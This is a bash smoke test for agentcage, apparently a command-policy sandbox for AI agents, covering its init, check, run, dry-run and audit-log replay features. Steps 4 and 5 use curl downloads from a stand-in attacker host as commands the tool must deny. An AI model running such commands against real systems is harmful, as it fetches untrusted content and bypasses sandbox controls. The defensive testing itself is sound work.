#!/usr/bin/env bash
# Smoke test for agentcage.
#
# Exercises the CLI entry point end to end in a throwaway directory:
# init -> check (allow + deny) -> run (blocked, executed, dry-run) ->
# log -> log --replay. Every step is asserted; the script prints
# "SMOKE OK" and exits 0 only if all assertions pass.
#
# The script never touches the network. Kernel Landlock support is NOT
# required: `run` falls back to audit mode in containers and the script
# reports which mode was active.

set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BIN="$ROOT/target/debug/agentcage"

echo "[smoke] building agentcage (debug)"
(cd "$ROOT" && cargo build --quiet)
[ -x "$BIN" ] || { echo "[smoke] FAIL: binary not found at $BIN" >&2; exit 1; }

WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT
cd "$WORK"

fail() {
  echo "[smoke] FAIL: $1" >&2
  exit 1
}

# --- 1. init creates a policy file ---------------------------------------
"$BIN" init | grep -q "created .agentcage.toml" || fail "init did not report success"
[ -f .agentcage.toml ] || fail "policy file missing after init"
echo "[smoke] init: created .agentcage.toml"

# --- 2. --version and --help ---------------------------------------------
"$BIN" --version | grep -q "^agentcage 0.1.0$" || fail "unexpected --version output"
"$BIN" --help | grep -q "USAGE" || fail "--help lacks USAGE"
echo "[smoke] version/help: ok"

# --- 3. check: allowed command exits 0 -----------------------------------
out="$("$BIN" check -- cargo test)"
echo "$out" | grep -q '^allow: cargo test' || fail "expected allow for 'cargo test', got: $out"
echo "[smoke] check allow: $out"

# --- 4. check: denied command exits 2 ------------------------------------
set +e
out="$("$BIN" check "curl https://evil.example.com")"
code=$?
set -e
[ "$code" -eq 2 ] || fail "expected exit 2 for denied command, got $code"
echo "$out" | grep -q '^deny: curl' || fail "expected deny output, got: $out"
echo "[smoke] check deny: $out"

# --- 5. run: denied command is blocked and never executes ----------------
set +e
"$BIN" run -- "curl -o pwned.txt https://evil.example.com" 2>run-deny.err
code=$?
set -e
[ "$code" -eq 2 ] || fail "run of denied command should exit 2, got $code"
grep -q "blocked" run-deny.err || fail "run did not report the block"
[ ! -f pwned.txt ] || fail "denied command still executed"
echo "[smoke] run deny: blocked with exit 2, nothing executed"

# --- 6. run: allowed command executes; report sandbox mode ---------------
out="$("$BIN" run -- echo smoke-ok-marker 2>run-allow.err)"
echo "$out" | grep -q "smoke-ok-marker" || fail "allowed run produced no output"
mode_line="$(grep '^agentcage: sandbox' run-allow.err || true)"
[ -n "$mode_line" ] || fail "run did not report its sandbox mode"
echo "[smoke] run allow: executed; $mode_line"

# --- 7. run --dry-run prints the plan and executes nothing ---------------
out="$("$BIN" run --dry-run -- "echo hi > dry.txt")"
echo "$out" | grep -q "dry-run: allow" || fail "dry-run missing decision line"
echo "$out" | grep -q "read allowlist:" || fail "dry-run missing read allowlist"
[ ! -f dry.txt ] || fail "dry-run executed the command"
echo "[smoke] run dry-run: plan printed, nothing executed"

# --- 8. log lists the recorded decisions ----------------------------------
out="$("$BIN" log)"
echo "$out" | grep -q "deny" || fail "audit log lacks the deny entry"
echo "$out" | grep -q "curl" || fail "audit log lacks the curl command"
echo "$out" | grep -q "allow" || fail "audit log lacks the allow entry"
[ -f .agentcage/audit.jsonl ] || fail "audit JSONL file missing"
grep -qx '\*' .agentcage/.gitignore || fail "runtime dir lacks its .gitignore guard"
echo "[smoke] log: decisions recorded in .agentcage/audit.jsonl"

# --- 9. log --replay detects a policy change -----------------------------
cat > .agentcage.toml <<'EOF'
version = 1
[commands]
default = "allow"
EOF
out="$("$BIN" log --replay)"
echo "$out" | grep -q "deny -> allow" || fail "replay did not detect the loosened policy"
echo "$out" | grep -q "would change" || fail "replay missing summary line"
echo "[smoke] log replay: policy change detected against recorded history"

echo "SMOKE OK"
